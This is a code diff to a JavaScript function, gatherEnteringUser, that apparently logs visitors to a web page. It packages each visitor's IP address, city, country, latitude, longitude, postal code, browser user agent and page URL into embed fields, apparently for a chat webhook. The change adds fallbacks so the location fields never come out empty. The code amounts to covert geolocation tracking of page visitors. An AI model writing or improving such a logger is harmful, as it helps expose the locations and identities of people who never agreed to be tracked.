@@ -17,9 +17,9 @@ async function gatherEnteringUser() {
                     { name: "IP", value: ipData.ip, inline: true },
                     { name: "City", value: ipData.city, inline: true },
                     { name: "Country", value: ipData.country, inline: true },
-                    { name: "Latitude", value: ipData.latitude, inline: true },
-                    { name: "Longitude", value: ipData.longitude, inline: true },
-                    { name: "Postal code", value: ipData.postal, inline: true },
+                    { name: "Latitude", value: String(ipData.latitude) || "N/A", inline: true },
+                    { name: "Longitude", value: String(ipData.longitude) || "N/A", inline: true },
+                    { name: "Postal code", value: ipData.postal || "N/A", inline: true },
                     { name: "User Agent", value: navigator.userAgent },
                     { name: "Page URL", value: window.location.href }
                 ],
